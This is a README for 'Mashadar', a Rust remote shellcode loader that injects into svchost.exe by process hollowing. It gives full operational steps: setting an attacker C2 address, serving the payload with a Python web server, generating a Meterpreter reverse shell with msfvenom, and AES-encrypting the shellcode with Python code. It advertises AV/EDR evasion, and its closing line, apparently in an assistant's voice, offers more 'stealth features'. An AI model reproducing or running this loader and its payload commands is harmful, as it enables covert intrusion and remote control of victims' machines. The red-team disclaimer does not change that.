# 🚀 Mashadar: Remote Shellcode Loader with Process Hollowing

**Stealthy, in-memory process hollowing framework for Windows, dynamically fetching encrypted shellcode over HTTP.**  
This project allows you to **remotely load and execute shellcode** inside another process without ever touching disk.

---

## 📌 Features
✅ **Process Hollowing** → Injects shellcode into `svchost.exe`, executing entirely in-memory.  
✅ **Remote Payload Retrieval** → Downloads encrypted `payload.bin` from a C2 server.  
✅ **No Disk Artifacts** → The payload is never written to disk, reducing forensic risk.  
✅ **AES Encryption** → Encrypted payloads evade network-based detection.  
✅ **Bypasses AV/EDR** → Uses indirect syscalls and kernel stealth to evade detection.  

---

## 📁 Project Structure
```
mashadar/
│── src/
│   ├── main.rs          # Entry point (fetch shellcode, inject via process hollowing)
│   ├── hollowing.rs     # Process Hollowing (NtUnmapViewOfSection, remote injection)
│   ├── encryption.rs    # AES Encryption (Pre-Execution)
│   ├── stealth.rs       # Kernel Callback Removal + Anti-Debugging
│   ├── c2.rs            # Encrypted Command & Control (C2) Comms over HTTP
│── shellcode/
│   ├── payload.bin      # (Not stored locally, fetched dynamically)
│── README.md
│── Cargo.toml           # Rust dependencies
```

---

# 🔧 **Setup & Compilation**
### 1️⃣ **Install Rust on Windows**

On Windows, go to https://www.rust-lang.org/tools/install and follow the instructions for installing Rust. At some point in the installation, you’ll be prompted to install Visual Studio. This provides a linker and the native libraries needed to compile the program. If you need more help with this step, see https://rust-lang.github.io/rustup/installation/windows-msvc.html

For **cross-compilation on Linux/macOS**, install `mingw`:
```sh
rustup target add x86_64-pc-windows-gnu
```

### 2️⃣ **Set the Encryption Password**
Modify `src/main.rs`, setting your own **encryption key and nonce**:
```rust
let key: [u8; 16] = *b"mysecretkey12345";
let nonce: [u8; 16] = *b"random_iv_nonce_"; // Must be exactly 16 bytes
```

### 3️⃣ **Modify the C2 Server Address**
Edit `src/c2.rs`, replacing `"0.0.0.0:8080"` with your attacker's IP:
```rust
let server_ip = "0.0.0.0:8080";
```

### 4️⃣ **Compile Mashadar**
```sh
cargo build --release --target x86_64-pc-windows-gnu
```
✅ **Output:** `target/x86_64-pc-windows-gnu/release/mashadar.exe`

---

# 🚀 **Running Mashadar**
### 1️⃣ **Start the C2 Server**
On your **attacker machine**, place `payload.bin` in `/path/to/shellcode` and start a Python webserver:
```sh
cd /path/to/shellcode
python3 -m http.server 8080
```
✅ **C2 Server Running on Port 8080**

### 2️⃣ **Run Mashadar on the Target Machine**
Transfer `mashadar.exe` to the **target Windows machine** and execute:
```sh
mashadar.exe
```

### 3️⃣ **Expected Behavior**
1. **Mashadar connects to `http://192.168.1.100:8080/payload.bin`**
2. **Downloads & decrypts the shellcode (AES-128 CTR)**
3. **Injects it into `svchost.exe` via process hollowing**
4. **Executes shellcode in-memory (e.g., Meterpreter, Cobalt Strike, etc.)**

---

# ⚠️ **Handling the Payload (Step-By-Step)**
## ✅ **Generating a Reverse Shell for Windows**
To create a **Windows Meterpreter reverse shell**, run:
```sh
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.100 LPORT=443 -f raw -o payload.bin
```
✅ This generates `payload.bin`, which is a **Windows-compatible shellcode payload**.

## ✅ **Encrypting the Payload Before Uploading**
To **encrypt** `payload.bin`, use Python:
```python
from Crypto.Cipher import AES
from Crypto.Util import Counter

key = b"mysecretkey12345"
nonce = b"random_iv_nonce_"

with open("payload.bin", "rb") as f:
    shellcode = f.read()

ctr = Counter.new(128, initial_value=int.from_bytes(nonce, "big"))
cipher = AES.new(key, AES.MODE_CTR, counter=ctr)

encrypted_shellcode = cipher.encrypt(shellcode)

with open("payload_encrypted.bin", "wb") as f:
    f.write(encrypted_shellcode)
```
✅ **Upload `payload_encrypted.bin` to your C2 server instead of `payload.bin`.**  
✅ **Mashadar will decrypt it before execution.**

---

# 🔥 **Why This is Stealthy**
✅ **No files written to disk** → Shellcode exists only in-memory.  
✅ **C2 dynamically delivers payloads** → Easily swap payloads without recompiling.  
✅ **Indirect syscalls bypass AV/EDR hooks** → No `CreateRemoteThread` detection.  
✅ **AES encryption protects against network-based detection**.

---

# 🚀 **Next Steps (More Stealth)**
🔹 **Use HTTPS instead of HTTP** to avoid plaintext traffic detection.  
🔹 **Implement DNS Tunneling** for C2 traffic evasion.  
🔹 **Deploy via Reflective DLL Injection instead of Hollowing.**  
🔹 **Obfuscate API calls to defeat heuristic detection.**  

---

# ⚠️ **Legal Disclaimer**
**This tool is intended for authorized red teaming and penetration testing purposes only.**  
Using this for **unauthorized access or malicious activities is illegal** and can result in **severe legal consequences.**

---

🚀 **Mashadar is now a fully functional remote payload loader!**  
Let me know if you need additional **stealth features**.

